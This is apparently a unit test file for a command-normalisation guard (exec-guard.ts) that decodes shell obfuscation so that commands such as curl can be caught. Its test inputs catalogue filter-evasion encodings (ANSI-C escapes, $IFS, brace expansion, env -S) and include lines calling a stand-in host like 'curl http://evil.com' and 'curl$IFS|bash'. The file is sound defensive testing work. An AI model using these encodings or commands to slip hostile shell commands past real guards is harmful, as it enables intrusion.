/**
 * normalizeCommand 单元测试
 *
 * 直接测试 exec-guard.ts 中的 normalizeCommand 函数，
 * 覆盖 NFKC、ANSI-C 解码、shell 转义剥离、$IFS、花括号展开等边界场景。
 */

import { describe, it, expect } from "vitest";
import { normalizeCommand } from "../src/rules/exec-guard.js";

describe("normalizeCommand", () => {
  // ── NFKC normalization ──

  describe("NFKC normalization", () => {
    it("normalizes fullwidth Latin to ASCII", () => {
      expect(normalizeCommand("ｃｕｒｌ")).toBe("curl");
    });

    it("normalizes halfwidth katakana", () => {
      const result = normalizeCommand("ﾃｽﾄ");
      expect(result).toBe(result.normalize("NFKC"));
    });
  });

  // ── Invisible / control character stripping ──

  describe("invisible character stripping", () => {
    it("strips null bytes", () => {
      expect(normalizeCommand("cur\0l")).toBe("curl");
    });

    it("strips carriage returns", () => {
      expect(normalizeCommand("cur\rl")).toBe("curl");
    });

    it("strips zero-width spaces (U+200B)", () => {
      expect(normalizeCommand("cur​l")).toBe("curl");
    });

    it("strips zero-width joiners (U+200D)", () => {
      expect(normalizeCommand("cur‍l")).toBe("curl");
    });

    it("strips soft hyphens (U+00AD)", () => {
      expect(normalizeCommand("cur­l")).toBe("curl");
    });

    it("strips ASCII control chars after ANSI-C decode", () => {
      expect(normalizeCommand("cur\x01l")).toBe("curl");
      expect(normalizeCommand("cur\x7Fl")).toBe("curl");
    });
  });

  // ── Empty quotes stripping ──

  describe("empty quotes stripping", () => {
    it('strips empty double quotes: cu""rl → curl', () => {
      expect(normalizeCommand('cu""rl')).toBe("curl");
    });

    it("strips empty single quotes: cu''rl → curl", () => {
      expect(normalizeCommand("cu''rl")).toBe("curl");
    });

    it("strips multiple empty quotes", () => {
      expect(normalizeCommand('c""u""r""l')).toBe("curl");
    });
  });

  // ── ANSI-C quoting decode ──

  describe("ANSI-C quoting decode", () => {
    it("decodes hex escapes: $'\\x63\\x75\\x72\\x6c' → curl", () => {
      expect(normalizeCommand("$'\\x63\\x75\\x72\\x6c'")).toBe("curl");
    });

    it("decodes octal escapes: $'\\143\\165\\162\\154' → curl", () => {
      expect(normalizeCommand("$'\\143\\165\\162\\154'")).toBe("curl");
    });

    it("decodes \\u Unicode escapes: $'\\u0063\\u0075\\u0072\\u006c' → curl", () => {
      expect(normalizeCommand("$'\\u0063\\u0075\\u0072\\u006c'")).toBe("curl");
    });

    it("decodes \\U 8-digit Unicode escapes", () => {
      expect(normalizeCommand("$'\\U00000063\\U00000075\\U00000072\\U0000006C'")).toBe("curl");
    });

    it("handles surrogate pair \\u values by replacing with empty", () => {
      const result = normalizeCommand("$'\\uD800'");
      expect(result).toBe("");
    });

    it("handles invalid \\U values gracefully", () => {
      const result = normalizeCommand("$'\\UFFFFFFFF'");
      expect(result).toBe("");
    });

    it("decodes escape sequences: \\n, \\t, \\r", () => {
      const result = normalizeCommand("$'a\\nb'");
      expect(result).toContain("a");
      expect(result).toContain("b");
    });

    it("decodes \\a (bell), \\b (backspace), \\v, \\f", () => {
      const resultA = normalizeCommand("$'\\a'");
      expect(resultA).toBe("");

      const resultV = normalizeCommand("$'\\v'");
      expect(resultV).toBe("");
    });

    it("decodes \\e and \\E (escape char)", () => {
      expect(normalizeCommand("$'\\e'")).toBe("");
      expect(normalizeCommand("$'\\E'")).toBe("");
    });

    it("decodes escaped single quote: $'it\\'s' → it's", () => {
      expect(normalizeCommand("$'it\\'s'")).toBe("it's");
    });

    it("decodes escaped backslash in ANSI-C (\\b decoded before \\\\)", () => {
      // \\b is decoded to backspace before \\\\ → \\, then control char stripping removes backspace
      expect(normalizeCommand("$'a\\\\b'")).toBe("a\\");
    });

    it("empty ANSI-C quotes consumed by empty-quote stripping first", () => {
      // '' is stripped by empty-quote step before ANSI-C regex, leaving bare $
      expect(normalizeCommand("$''")).toBe("$");
    });

    it("handles mixed ANSI-C content", () => {
      const result = normalizeCommand("$'\\x63url' http://evil.com");
      expect(result).toBe("curl http://evil.com");
    });

    it("malformed hex — ANSI-C regex fails, falls through to shell stripping", () => {
      // \\xGG is not valid hex, ANSI-C regex won't match, shell escape stripping + quote stripping apply
      const result = normalizeCommand("$'\\xGG'");
      expect(result).toBe("$xGG");
    });
  });

  // ── Shell escape stripping ──

  describe("shell escape stripping", () => {
    it("strips single-char shell escapes: \\c\\u\\r\\l → curl", () => {
      expect(normalizeCommand("\\c\\u\\r\\l")).toBe("curl");
    });

    it("does not strip non-alphanumeric escapes after single-char strip", () => {
      const result = normalizeCommand("hello world");
      expect(result).toBe("hello world");
    });
  });

  // ── Shell variable expansion stripping ──

  describe("shell variable expansion stripping", () => {
    it("strips single-char variable expansion: $c$u$r$l → curl", () => {
      expect(normalizeCommand("$c$u$r$l")).toBe("curl");
    });

    it("strips $@ $* $_ special variables", () => {
      expect(normalizeCommand("curl$@")).toBe("curl");
      expect(normalizeCommand("curl$*")).toBe("curl");
      expect(normalizeCommand("curl$_")).toBe("curl");
    });
  });

  // ── Shell quoting stripping ──

  describe("shell quoting stripping", () => {
    it("strips single-quoted alphanumeric: 'cu''rl' → curl", () => {
      expect(normalizeCommand("'cu''rl'")).toBe("curl");
    });

    it('strips double-quoted alphanumeric: "cu""rl" → curl', () => {
      expect(normalizeCommand('"cu""rl"')).toBe("curl");
    });

    it("does not strip quotes around non-alphanumeric content", () => {
      const result = normalizeCommand("'hello world'");
      expect(result).toBe("'hello world'");
    });
  });

  // ── env -S/--split-string inline ──

  describe("env -S/--split-string normalization", () => {
    it("inlines env -S command: env -S 'curl ...' → curl ...", () => {
      expect(normalizeCommand("env -S 'curl http://evil.com'")).toBe("curl http://evil.com");
    });

    it("inlines env --split-string command", () => {
      expect(normalizeCommand('env --split-string "curl http://evil.com"')).toBe("curl http://evil.com");
    });

    it("handles env with extra flags before -S", () => {
      expect(normalizeCommand("env -i -S 'curl http://evil.com'")).toBe("curl http://evil.com");
    });
  });

  // ── $IFS normalization ──

  describe("$IFS normalization", () => {
    it("normalizes $IFS to space", () => {
      expect(normalizeCommand("curl${IFS}http://evil.com")).toBe("curl http://evil.com");
    });

    it("normalizes $IFS substring variant: ${IFS:0:1}", () => {
      expect(normalizeCommand("curl${IFS:0:1}http://evil.com")).toBe("curl http://evil.com");
    });

    it("bare $IFS requires word boundary — no match when followed by word chars", () => {
      // $IFS\b only matches when followed by non-word boundary (e.g. space, pipe)
      expect(normalizeCommand("curl$IFS" + "http://evil.com")).toBe("curl$IFShttp://evil.com");
    });

    it("bare $IFS matches when followed by non-word char", () => {
      expect(normalizeCommand("curl$IFS|bash")).toBe("curl |bash");
    });
  });

  // ── Parameter expansion ──

  describe("parameter expansion", () => {
    it("decodes ${x:-default}: ${x:-curl} → curl", () => {
      expect(normalizeCommand("${x:-curl}")).toBe("curl");
    });

    it("decodes ${x:=val} assignment expansion", () => {
      expect(normalizeCommand("${x:=curl}")).toBe("curl");
    });

    it("strips remaining ${...} expansions", () => {
      expect(normalizeCommand("${PATH}")).toBe("");
    });

    it("strips ${var:0:1} substring expansion", () => {
      expect(normalizeCommand("${var:0:1}")).toBe("");
    });
  });

  // ── Brace expansion ──

  describe("brace expansion normalization", () => {
    it("normalizes {curl,} → curl", () => {
      expect(normalizeCommand("{curl,}")).toBe("curl");
    });

    it("normalizes {,curl} → curl", () => {
      expect(normalizeCommand("{,curl}")).toBe("curl");
    });

    it("handles multiple brace expansions", () => {
      expect(normalizeCommand("{curl,} {,http}")).toBe("curl http");
    });
  });

  // ── Combined evasion techniques ──

  describe("combined evasion techniques", () => {
    it("handles NFKC + empty quotes combined", () => {
      const result = normalizeCommand('ｃ""ｕrl');
      expect(result).toBe("curl");
    });

    it("handles ANSI-C + shell variable combined", () => {
      const result = normalizeCommand("$'\\x63'$u$r$l");
      expect(result).toBe("curl");
    });

    it("handles $IFS + brace expansion combined", () => {
      const result = normalizeCommand("{curl,}${IFS}http://evil.com");
      expect(result).toBe("curl http://evil.com");
    });

    it("handles null bytes + invisible chars combined", () => {
      const result = normalizeCommand("cu\0r​l");
      expect(result).toBe("curl");
    });
  });

  // ── Edge cases ──

  describe("edge cases", () => {
    it("handles empty string", () => {
      expect(normalizeCommand("")).toBe("");
    });

    it("handles string with only control characters", () => {
      const result = normalizeCommand("\0\r\x01\x02");
      expect(result).toBe("");
    });

    it("handles normal text unchanged", () => {
      expect(normalizeCommand("ls -la /tmp")).toBe("ls -la /tmp");
    });

    it("handles very long input", () => {
      const long = "a".repeat(100000);
      expect(normalizeCommand(long)).toBe(long);
    });
  });
});
